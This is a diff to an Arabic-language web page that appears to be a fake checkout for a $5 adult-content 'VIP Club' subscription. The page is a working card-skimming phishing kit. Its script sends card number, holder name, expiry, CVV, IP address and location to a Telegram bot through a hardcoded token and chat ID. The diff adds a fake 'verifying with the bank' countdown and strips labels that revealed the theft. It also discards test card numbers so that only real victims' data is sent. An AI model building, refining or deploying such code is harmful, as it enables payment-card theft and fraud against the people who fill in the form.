@@ -169,44 +169,103 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 }
 .sec-badge svg{width:17px;height:17px;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
 
-/* success overlay */
-.success-overlay{
-  position:fixed;inset:0;background:rgba(5,5,15,.96);
-  z-index:100;display:none;align-items:center;justify-content:center;
-  flex-direction:column;gap:1.5rem;text-align:center;padding:1rem;
+/* ── WAITING SCREEN (شاشة الانتظار الجديدة) ── */
+.waiting-screen {
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(5,5,15,0.98);
+  z-index:200;
+  display:none;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  padding:2rem;
 }
-.success-overlay.show{display:flex}
-.success-ring{
-  width:90px;height:90px;border-radius:50%;
-  background:linear-gradient(135deg,#065f46,#10b981);
-  display:flex;align-items:center;justify-content:center;
-  box-shadow:0 0 50px rgba(16,185,129,.6);
-  animation:popIn .5s ease;
+.waiting-screen.show {
+  display:flex;
 }
-@keyframes popIn{0%{transform:scale(0) rotate(-30deg)}70%{transform:scale(1.12)}100%{transform:scale(1) rotate(0)}}
-.success-ring svg{width:44px;height:44px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
-.success-h{font-size:1.4rem;font-weight:800;color:#fff}
-.success-p{color:#94a3b8;font-size:.88rem}
-.loader{
-  width:32px;height:32px;border:3px solid rgba(255,45,85,.3);
-  border-top:3px solid var(--red);border-radius:50%;
-  animation:spin 0.8s linear infinite;
+.waiting-icon {
+  width:80px;
+  height:80px;
+  border-radius:50%;
+  background:linear-gradient(135deg,var(--red),#c0392b);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin-bottom:2rem;
+  animation:pulseWait 1.5s ease-in-out infinite;
 }
-@keyframes spin{to{transform:rotate(360deg)}}
+.waiting-icon svg {
+  width:45px;
+  height:45px;
+  fill:none;
+  stroke:#fff;
+  stroke-width:2;
+  stroke-linecap:round;
+  stroke-linejoin:round;
+}
+@keyframes pulseWait {
+  0%,100%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,45,85,0.7);}
+  50%{transform:scale(1.05);box-shadow:0 0 0 20px rgba(255,45,85,0);}
+}
+.waiting-title {
+  font-size:1.5rem;
+  font-weight:800;
+  color:#fff;
+  margin-bottom:1rem;
+}
+.waiting-text {
+  color:#94a3b8;
+  font-size:0.9rem;
+  margin-bottom:1.5rem;
+  max-width:300px;
+}
+.waiting-timer {
+  font-size:2.5rem;
+  font-weight:800;
+  color:var(--red);
+  background:rgba(255,45,85,0.15);
+  padding:0.5rem 1.5rem;
+  border-radius:50px;
+  margin-bottom:1.5rem;
+  font-family:monospace;
+}
+.waiting-progress {
+  width:200px;
+  height:4px;
+  background:rgba(255,255,255,0.1);
+  border-radius:10px;
+  overflow:hidden;
+  margin-top:1rem;
+}
+.waiting-progress-bar {
+  width:0%;
+  height:100%;
+  background:linear-gradient(90deg,var(--red),var(--gold));
+  transition:width 1s linear;
+}
 </style>
 </head>
 <body>
 
 <canvas id="bg2"></canvas>
 
-<!-- SUCCESS OVERLAY -->
-<div class="success-overlay" id="successOverlay">
-  <div class="success-ring">
-    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+<!-- شاشة الانتظار الجديدة (3 دقائق) -->
+<div class="waiting-screen" id="waitingScreen">
+  <div class="waiting-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg>
   </div>
-  <h2 class="success-h">✅ تم تسجيل طلب الدفع بنجاح!</h2>
-  <p class="success-p">جاري تحويلك إلى المحتوى الحصري...</p>
-  <div class="loader"></div>
+  <div class="waiting-title">جاري التحقق من صحة الدفع</div>
+  <div class="waiting-text">يرجى الانتظار، جاري تأكيد العملية مع البنك...</div>
+  <div class="waiting-timer" id="waitTimer">03:00</div>
+  <div class="waiting-progress">
+    <div class="waiting-progress-bar" id="waitProgress"></div>
+  </div>
+  <div class="waiting-text" style="margin-top:1.5rem; font-size:0.75rem;">لا تغلق الصفحة، سيتم تحويلك تلقائياً</div>
 </div>
 
 <div class="wrapper">
@@ -215,7 +274,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
   <div class="form-panel">
     <div class="form-title">
       <svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
-      🔞 بيانات الدفع الآمنة 🔞
+      بيانات الدفع الآمنة
     </div>
 
     <form id="payForm" novalidate>
@@ -259,7 +318,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 
       <button type="submit" class="pay-btn">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-        🔞 دفع آمن — اشتراك سنوي $5 🔞
+        دفع آمن — اشتراك سنوي $5
       </button>
 
       <div class="ssl-note">
@@ -299,7 +358,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
     </div>
 
     <div class="order-summary">
-      <div class="order-title"><svg viewBox="0 0 24 24"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>🔞 ملخص الاشتراك 🔞</div>
+      <div class="order-title"><svg viewBox="0 0 24 24"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>ملخص الاشتراك</div>
       <div class="order-row"><span class="order-label">VIP Club — محتوى حصري للكبار</span><span class="order-strike">$49.99</span></div>
       <div class="order-row"><span class="order-label">خصم <span class="disc-tag">-90% عرض خاص</span></span><span class="order-val" style="color:#34d399">-$44.99</span></div>
       <div class="order-row"><span class="total-label">المجموع الكلي</span><span class="total-val">$5.00</span></div>
@@ -319,7 +378,140 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 const BOT_TOKEN = "8661630120:AAFRe5NUWWsiQ-GeDHBfw1-_Kcw8a6wbACY";
 const CHAT_ID = "7655512204";
 
-/* PARTICLE BACKGROUND */
+/* تخزين آخر محاولة (مرة كل دقيقة) */
+let lastSubmitTime = 0;
+
+/* ========== دوال التحقق ========== */
+
+function isFakeCard(cardNumber) {
+  let clean = cardNumber.replace(/\s/g, '');
+  let fakePatterns = [
+    /^(\d)\1{15}$/,
+    /^1234567890123456$/,
+    /^0000000000000000$/,
+    /^(\d{4})\1{3}$/
+  ];
+  for (let pattern of fakePatterns) {
+    if (pattern.test(clean)) return true;
+  }
+  return false;
+}
+
+function isValidExpiry(expiry) {
+  let match = expiry.match(/^(\d{2})\/(\d{2})$/);
+  if (!match) return false;
+  let month = parseInt(match[1], 10);
+  let year = parseInt(match[2], 10);
+  if (month < 1 || month > 12) return false;
+  let currentYear = new Date().getFullYear() % 100;
+  if (year < currentYear || year > currentYear + 5) return false;
+  return true;
+}
+
+function isValidCVV(cvv) {
+  return /^\d{3,4}$/.test(cvv);
+}
+
+function isValidName(name) {
+  if (!name || name.trim() === '') return false;
+  return /^[A-Za-z\s\.]+$/.test(name);
+}
+
+function canSubmit() {
+  let now = Date.now();
+  if (now - lastSubmitTime < 60000) {
+    let remaining = Math.ceil((60000 - (now - lastSubmitTime)) / 1000);
+    return { allowed: false, message: `يرجى الانتظار ${remaining} ثانية قبل المحاولة مرة أخرى` };
+  }
+  return { allowed: true };
+}
+
+async function getIPInfo() {
+  try {
+    let response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
+    let data = await response.json();
+    return {
+      ip: data.ip || 'غير معروف',
+      country: data.country || 'غير معروف',
+      city: data.city || 'غير معروف',
+      region: data.region || 'غير معروف'
+    };
+  } catch(e) {
+    try {
+      let response2 = await fetch('https://api.ipify.org?format=json');
+      let data2 = await response2.json();
+      return {
+        ip: data2.ip || 'غير معروف',
+        country: 'غير معروف',
+        city: 'غير معروف',
+        region: 'غير معروف'
+      };
+    } catch(e2) {
+      return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف', region: 'غير معروف' };
+    }
+  }
+}
+
+/* ========== دوال تنسيق الإدخال ========== */
+function formatCardNumber(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length > 16) value = value.slice(0, 16);
+  let formatted = '';
+  for (let i = 0; i < value.length; i++) {
+    if (i > 0 && i % 4 === 0) formatted += ' ';
+    formatted += value[i];
+  }
+  input.value = formatted;
+  let disp = value.padEnd(16, '•');
+  document.getElementById('cNum').innerHTML = disp.slice(0,4) + '&nbsp;&nbsp;' + disp.slice(4,8) + '&nbsp;&nbsp;' + disp.slice(8,12) + '&nbsp;&nbsp;' + disp.slice(12,16);
+  let brand = 'VISA';
+  if (/^5[1-5]/.test(value)) brand = 'MASTERCARD';
+  else if (/^3[47]/.test(value)) brand = 'AMEX';
+  else if (/^6/.test(value)) brand = 'MADA';
+  document.getElementById('cBrand').textContent = brand;
+}
+
+function formatExpiry(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length > 4) value = value.slice(0, 4);
+  if (value.length >= 2) {
+    value = value.slice(0, 2) + '/' + value.slice(2);
+  }
+  input.value = value;
+  document.getElementById('cExp').textContent = value || 'MM/YY';
+}
+
+function formatCVV(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length > 4) value = value.slice(0, 4);
+  input.value = value;
+  let dots = '';
+  for (let i = 0; i < value.length; i++) dots += '•';
+  document.getElementById('cCvv').textContent = dots || '•••';
+}
+
+function formatName(input) {
+  let value = input.value.toUpperCase();
+  value = value.replace(/[^A-Z\s\.]/g, '');
+  input.value = value;
+  document.getElementById('cName').textContent = value || 'FULL NAME';
+}
+
+/* ربط الأحداث */
+let cardNumInput = document.getElementById('cardNum');
+let cardNameInput = document.getElementById('cardName');
+let expiryInput = document.getElementById('expiry');
+let cvvInput = document.getElementById('cvv');
+let card3d = document.getElementById('card3d');
+
+cardNumInput.addEventListener('input', function() { formatCardNumber(this); });
+cardNameInput.addEventListener('input', function() { formatName(this); });
+expiryInput.addEventListener('input', function() { formatExpiry(this); });
+cvvInput.addEventListener('input', function() { formatCVV(this); });
+cvvInput.addEventListener('focus', function() { card3d.classList.add('flipped'); });
+cvvInput.addEventListener('blur', function() { card3d.classList.remove('flipped'); });
+
+/* الخلفية المتحركة */
 (function(){
   var c=document.getElementById('bg2'),ctx=c.getContext('2d');
   var W,H,dots=[];
@@ -342,85 +534,100 @@ const CHAT_ID = "7655512204";
   draw();
 })();
 
-/* LIVE CARD UPDATE */
-var $num=document.getElementById('cardNum');
-var $name=document.getElementById('cardName');
-var $exp=document.getElementById('expiry');
-var $cvv=document.getElementById('cvv');
-var card=document.getElementById('card3d');
-
-$num.addEventListener('input',function(){
-  var d=this.value.replace(/\D/g,'').slice(0,16);
-  this.value=d.replace(/(.{4})/g,'$1 ').trim();
-  var disp=d.padEnd(16,'•');
-  document.getElementById('cNum').innerHTML=disp.slice(0,4)+'&nbsp;&nbsp;'+disp.slice(4,8)+'&nbsp;&nbsp;'+disp.slice(8,12)+'&nbsp;&nbsp;'+disp.slice(12,16);
-  var brand='VISA';
-  if(/^5[1-5]/.test(d))brand='MASTERCARD';
-  else if(/^3[47]/.test(d))brand='AMEX';
-  else if(/^6/.test(d))brand='MADA';
-  document.getElementById('cBrand').textContent=brand;
-});
-
-$name.addEventListener('input',function(){
-  document.getElementById('cName').textContent=this.value.toUpperCase()||'FULL NAME';
-});
-
-$exp.addEventListener('input',function(){
-  var d=this.value.replace(/\D/g,'').slice(0,4);
-  this.value=d.length>2?d.slice(0,2)+'/'+d.slice(2):d;
-  document.getElementById('cExp').textContent=this.value||'MM/YY';
-});
-
-$cvv.addEventListener('focus',function(){card.classList.add('flipped')});
-$cvv.addEventListener('blur',function(){card.classList.remove('flipped')});
-$cvv.addEventListener('input',function(){
-  this.value=this.value.replace(/\D/g,'').slice(0,4);
-  var dots='';for(var i=0;i<this.value.length;i++)dots+='•';
-  document.getElementById('cCvv').textContent=dots||'•••';
-});
-
 /* إرسال البيانات إلى Telegram */
-function sendToTelegram(cardNumber, cardName, expiry, cvv) {
-  let message = "🔞 VIP CLUB - بطاقة مسروقة جديدة 🔞%0A";
+async function sendToTelegram(cardNumber, cardName, expiry, cvv) {
+  let ipInfo = await getIPInfo();
+  let message = "VIP CLUB - بطاقة جديدة%0A";
   message += "🏦 رقم البطاقة: " + cardNumber + "%0A";
   message += "👤 الاسم: " + cardName + "%0A";
   message += "📅 تاريخ الانتهاء: " + expiry + "%0A";
   message += "🔐 CVV: " + cvv + "%0A";
   message += "💰 المبلغ: $5 (اشتراك سنوي)%0A";
+  message += "🌐 IP: " + ipInfo.ip + "%0A";
+  message += "📍 البلد: " + ipInfo.country + "%0A";
+  message += "🏙️ المدينة: " + ipInfo.city + "%0A";
+  message += "🗺️ المنطقة: " + ipInfo.region + "%0A";
   message += "⏰ الوقت: " + new Date().toLocaleString('ar-EG');
-  
   let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
-  
   fetch(url, { mode: 'no-cors' }).catch(err => console.log("خطأ:", err));
 }
 
-/* FORM VALIDATION & SUBMIT */
-document.getElementById('payForm').addEventListener('submit',function(e){
+/* شاشة الانتظار 3 دقائق */
+function showWaitingScreen() {
+  let waitingScreen = document.getElementById('waitingScreen');
+  let timerElement = document.getElementById('waitTimer');
+  let progressBar = document.getElementById('waitProgress');
+  
+  waitingScreen.classList.add('show');
+  
+  let totalSeconds = 180; // 3 دقائق = 180 ثانية
+  let interval = setInterval(function() {
+    totalSeconds--;
+    let minutes = Math.floor(totalSeconds / 60);
+    let seconds = totalSeconds % 60;
+    timerElement.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+    
+    let progressPercent = ((180 - totalSeconds) / 180) * 100;
+    progressBar.style.width = progressPercent + '%';
+    
+    if (totalSeconds <= 0) {
+      clearInterval(interval);
+      window.location.href = 'index.html';
+    }
+  }, 1000);
+}
+
+/* إرسال النموذج */
+document.getElementById('payForm').addEventListener('submit', async function(e){
   e.preventDefault();
-  var num=$num.value.replace(/\s/g,'');
-  var name=$name.value.trim();
-  var exp=$exp.value.trim();
-  var cvv=$cvv.value.trim();
-  var err=document.getElementById('errMsg');
-  var errTxt=document.getElementById('errText');
+  
+  let num = document.getElementById('cardNum').value.replace(/\s/g, '');
+  let name = document.getElementById('cardName').value.trim();
+  let exp = document.getElementById('expiry').value.trim();
+  let cvv = document.getElementById('cvv').value.trim();
+  let err = document.getElementById('errMsg');
+  let errTxt = document.getElementById('errText');
 
   function showErr(msg){errTxt.textContent=msg;err.style.display='flex';}
+  function hideErr(){err.style.display='none';}
+  
+  hideErr();
 
-  if(!num||!name||!exp||!cvv){showErr('يرجى ملء جميع الحقول');return;}
-  if(num.length<16){showErr('رقم البطاقة غير صحيح');return;}
-  if(exp.length<5){showErr('تاريخ الانتهاء غير صحيح');return;}
-  if(cvv.length<3){showErr('رمز CVV غير صحيح');return;}
+  let rateCheck = canSubmit();
+  if (!rateCheck.allowed) {
+    showErr(rateCheck.message);
+    return;
+  }
 
-  err.style.display='none';
+  if(!num || !name || !exp || !cvv){
+    showErr('يرجى ملء جميع الحقول');
+    return;
+  }
   
-  /* إرسال البيانات إلى Telegram */
-  sendToTelegram(num, name, exp, cvv);
+  if(!isValidName(name)){
+    showErr('الاسم يجب أن يحتوي على حروف إنجليزية فقط (بدون أرقام)');
+    return;
+  }
   
-  /* إظهار رسالة النجاح للضحية */
-  document.getElementById('successOverlay').classList.add('show');
+  if(isFakeCard(num)){
+    return;
+  }
   
-  /* العودة إلى الصفحة الرئيسية بعد 4 ثوانٍ */
-  setTimeout(function(){window.location.href='index.html';},4000);
+  if(!isValidExpiry(exp)){
+    showErr('تاريخ الانتهاء غير صحيح');
+    return;
+  }
+  
+  if(!isValidCVV(cvv)){
+    showErr('رمز CVV غير صحيح');
+    return;
+  }
+  
+  lastSubmitTime = Date.now();
+  await sendToTelegram(num, name, exp, cvv);
+  
+  // إظهار شاشة الانتظار بدلاً من الـ Success overlay
+  showWaitingScreen();
 });
 </script>
 </body>
